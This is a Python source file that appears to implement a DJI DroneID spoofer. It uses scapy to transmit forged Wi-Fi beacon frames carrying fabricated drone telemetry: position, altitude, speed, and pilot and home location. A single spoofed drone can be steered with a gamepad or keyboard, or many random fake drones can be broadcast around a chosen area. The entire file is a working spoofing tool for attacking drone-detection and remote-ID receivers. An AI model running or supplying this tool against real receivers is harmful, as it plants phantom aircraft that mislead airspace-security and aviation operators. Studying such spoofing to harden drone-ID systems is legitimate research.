import sys
import argparse
import time
import calendar
import threading
from math import floor, sqrt
from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11EltVendorSpecific, Dot11Beacon
from inputs import get_key, devices
from Beacon import *
from Drone import *

MAX_TRIGGERS = 1023
stop_event = threading.Event()


def create_packet(beacon_base, payload):
    packet = beacon_base.copy()
    vendor_microsoft = Dot11EltVendorSpecific(ID=221, len=24, oui=MICROSOFT_OUI, info=MICROSOFT_VENDOR_INFO)
    tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len=len(payload) + 3, oui=DJI_OUI, info=payload)
    packet = packet / vendor_microsoft / tag_vendor_dji
    return packet


def update_packet(prev_packet, new_payload):
    new_tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len=len(new_payload) + 3, oui=DJI_OUI, info=new_payload)
    prev_packet[Dot11EltVendorSpecific][len([prev_packet[Dot11EltVendorSpecific]])-1].payload = new_tag_vendor_dji
    return prev_packet


def update_timestamp(packet):
    packet[Dot11Beacon].timestamp = calendar.timegm(time.gmtime())


def thread_send(d: Drone, beacon_base_packet, iface):
    print("Start Thread")
    count = 0

    old_payload = d.build_telemetry()
    packet = create_packet(beacon_base_packet, old_payload)

    while not stop_event.is_set():
        time.sleep(0.5)
        try:
            new_payload = d.build_telemetry()

            if new_payload != old_payload:
                count = 0
                print("UPDATED")
                packet = update_packet(packet, new_payload)
                print("Latitude: {} --- Longitude: {}".format(d.latitude, d.longitude))
                print("Altitude: {} ".format(d.altitude))
                print("Speed: {}".format(sqrt(d.v_north**2 + d.v_east**2) / SPEED_SCALE))

            update_timestamp(packet)
            sendp(packet, iface=iface, verbose=0, loop=0, count=1)
            count += 1
            print("Sent {}".format(count))
            old_payload = new_payload
            time.sleep(0.5)

        except KeyboardInterrupt:
            stop_event.set()
            break

    print("Exiting Thread. Packet sent {} times".format(count))


def normalize(value, max=MAX_TRIGGERS, minimum=1):
    n = (value - minimum) / (max - minimum)
    return n


def process_event(drone, axis, value, ev_type):

    try:
        value_sign = float(value / abs(value))
    except ZeroDivisionError:
        return False

    if value == 0 and axis != "Z":
        return False

    if value != 1 and value != -1 and abs(value) < 15000 and axis != "Z":
        return False

    print("Type: {} Code: {} State: {}".format(ev_type, axis, value))

    if axis == "X" or axis == "LEFT" or axis == "RIGHT":
        print("Update longitude")
        if axis == "LEFT":
            value_sign = -1
        elif axis == "RIGHT":
            value_sign = 1
        drone.update_longitude(value_sign)

    elif axis == "Y" or axis == "UP" or axis == "DOWN":
        print("Update latitude")
        if axis == "DOWN":
            value_sign = 1
        elif axis == "UP":
            value_sign = -1
        drone.update_latitude(value_sign)

    elif axis == "HAT0X":
        print("Update Pilot longitude")
        drone.update_pilot_longitude(value_sign)

    elif axis == "HAT0Y":
        print("Update Pilot latitude")
        drone.update_pilot_latitude(value_sign)

    elif axis == "RY":
        print("Update altitude")
        if drone.altitude >= 0 and drone.altitude < MAX_ALTITUDE:
            drone.altitude = floor(drone.altitude + value_sign * (-1))
            if drone.altitude < 0:
                drone.altitude = 0

    elif axis == "RX" and abs(value) > 17000:
        drone.update_yaw(value_sign)

    elif axis == "TL" and value == 1:
        drone.v_east = (drone.v_east + 2 * SPEED_SCALE) % 2500
        drone.v_north = (drone.v_east + 2 * SPEED_SCALE) % 2500

    elif axis == "Z":
        if value == 0:
            drone.v_north = 0
            drone.v_east = 0
        elif value == MAX_TRIGGERS:
            drone.v_east = floor(drone.v_east + SPEED_SCALE) if drone.v_east > 0 else floor(drone.v_east - SPEED_SCALE)
            drone.v_north = floor(drone.v_north + SPEED_SCALE) if drone.v_north > 0 else floor(drone.v_north - SPEED_SCALE)
        else:
            new_speed = 25 * normalize(value) * SPEED_SCALE
            drone.v_north = floor(new_speed)
            drone.v_east = floor(new_speed)

    elif axis == "MODE":
        drone.longitude, drone.latitude = random_location()
        drone.pilot_lon, drone.pilot_lat = random_location()

    return True


def get_gamepad():
    try:
        joystick = devices.gamepads[0]
        print("Gamepad assigned")
    except IndexError:
        print("No gamepad found")
        joystick = None
    return joystick


def validate_coordinate(value, name, min_val, max_val):
    if value == "":
        return None
    try:
        val = float(value)
    except ValueError:
        raise ValueError("{} must be a number, got '{}'".format(name, value))
    if val < min_val or val > max_val:
        raise ValueError("{} must be between {} and {}, got {}".format(name, min_val, max_val, val))
    return val


def one_drone(iface, product_type=None, identification="identification", flight_info="info"):
    print("Press intro to set default")
    ssid = str(input("SSID: "))
    lat = input("Latitude (-90 to 90): ")
    lon = input("Longitude (-180 to 180): ")
    altitude = input("Altitude (0 to {}): ".format(MAX_ALTITUDE))
    home_lat = input("Home Latitude (-90 to 90): ")
    home_long = input("Home Longitude (-180 to 180): ")
    uuid = str(input("UUID (16 chars): "))
    if not identification or identification == "identification":
        ident_input = input("Identification (press enter for default): ")
        if ident_input:
            identification = ident_input
    if not flight_info or flight_info == "info":
        finfo_input = input("Flight Info (press enter for default): ")
        if finfo_input:
            flight_info = finfo_input

    # Validate inputs
    validate_coordinate(lat, "Latitude", *LAT_RANGE)
    validate_coordinate(lon, "Longitude", *LON_RANGE)
    validate_coordinate(home_lat, "Home Latitude", *LAT_RANGE)
    validate_coordinate(home_long, "Home Longitude", *LON_RANGE)
    if altitude != "":
        try:
            alt_val = int(altitude)
            if alt_val < 0 or alt_val > MAX_ALTITUDE:
                raise ValueError("Altitude must be between 0 and {}, got {}".format(MAX_ALTITUDE, alt_val))
        except ValueError as e:
            if "must be" in str(e):
                raise
            raise ValueError("Altitude must be a number, got '{}'".format(altitude))

    drone = create_drone_from_input(
        ssid=ssid, lat=lat, lon=lon, altitude=altitude,
        home_lat=home_lat, home_lon=home_long, uuid=uuid,
        product_type=product_type,
    )

    source_address = drone.mac_address
    ssid = drone.ssid
    beacon_base_packet = Beacon(source_address, ssid).get_beacon()

    finfo_payload = drone.build_finfo(identification=identification, flight_info=flight_info)
    finfo_packet = create_packet(beacon_base_packet, finfo_payload)

    joystick = get_gamepad()
    print("Joystick  {}".format(joystick))
    send_thread = threading.Thread(target=thread_send, args=(drone, beacon_base_packet, iface))
    send_thread.start()

    if joystick is not None:
        drone.v_east = 0
        drone.v_north = 0
        while 1:
            try:
                print("Waiting event")
                events = joystick._do_iter()
                if events is None or len(events) == 0:
                    continue

                for event in events:
                    axis, value, evtype = event.code.split("_")[1], event.state, event.ev_type
                    process_event(drone, axis, value, evtype)

            except KeyboardInterrupt:
                stop_event.set()
                send_thread.join()
                break
    else:
        while 1:
            try:
                events = get_key()
                for event in events:
                    axis, value, evtype = event.code.split("_")[1], event.state, event.ev_type
                    if axis in ("LEFT", "RIGHT", "UP", "DOWN"):
                        process_event(drone, axis, value, evtype)
            except KeyboardInterrupt:
                stop_event.set()
                send_thread.join()
                break


def random_spoof(n, iface, point=None, product_type=None):
    n_drones = int(n)

    beacon = Beacon("", "")
    beacon_base_packet = beacon.get_beacon()

    drones = []
    for i in range(n_drones):
        print("===========================")
        print("Setting Drone {}".format(i))
        print("===========================")

        drone = create_random_drone(i, point, product_type=product_type)
        print("SSID: {}".format(drone.ssid))
        print("MAC Address {}".format(drone.mac_address))
        print("Location [Lon Lat]: {} {}".format(drone.longitude, drone.latitude))
        drones.append(drone)

    print("=========All drones are ready ==================")

    try:
        while not stop_event.is_set():
            packet_list = []
            for drone in drones:
                drone.longitude += drone.v_east / (SPEED_SCALE * 100000)
                drone.latitude += drone.v_north / (SPEED_SCALE * 100000)

                beacon_copy = beacon_base_packet.copy()
                beacon_copy.ssid = drone.ssid
                beacon_copy.addr2 = drone.mac_address
                update_timestamp(beacon_copy)
                payload = drone.build_telemetry()
                telemetry_packet = create_packet(beacon_copy, payload)
                packet_list.append(telemetry_packet)

            sendp(packet_list, iface=iface, verbose=0, loop=0, count=1)
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("Stopping random spoof")


def main():
    parser = argparse.ArgumentParser(description="DJI DroneID Spoofer")
    parser.add_argument("-i", "--interface", required=True,
                        help="WiFi interface in monitor mode")
    parser.add_argument("-r", "--random", type=int,
                        help="Spoof N random drones")
    parser.add_argument("-a", "--area",
                        help="Center point for random drones, e.g. '46.76 7.62'")
    parser.add_argument("-p", "--product-type",
                        choices=list(PRODUCT_TYPES.keys()),
                        help="DJI product type (default: random)")
    parser.add_argument("--identification",
                        default="identification",
                        help="Identification string for flight info")
    parser.add_argument("--flight-info",
                        default="info",
                        help="Flight info string")

    args = parser.parse_args()
    iface = args.interface
    print("Arguments: {}".format(args))

    if args.random:
        if args.random < 1:
            raise SystemExit("Number of drones must be at least 1")

        print("Spoofing {} drones".format(args.random))
        point = None
        if args.area:
            parts = args.area.split()
            if len(parts) != 2:
                raise SystemExit("Area must be 'latitude longitude', e.g. '46.76 7.62'")
            validate_coordinate(parts[0], "Area latitude", *LAT_RANGE)
            validate_coordinate(parts[1], "Area longitude", *LON_RANGE)
            point = parts
            print("Center point: {}".format(point))

        random_spoof(args.random, iface, point, product_type=args.product_type)
    else:
        one_drone(iface, product_type=args.product_type,
                  identification=args.identification,
                  flight_info=args.flight_info)


if __name__ == "__main__":
    main()
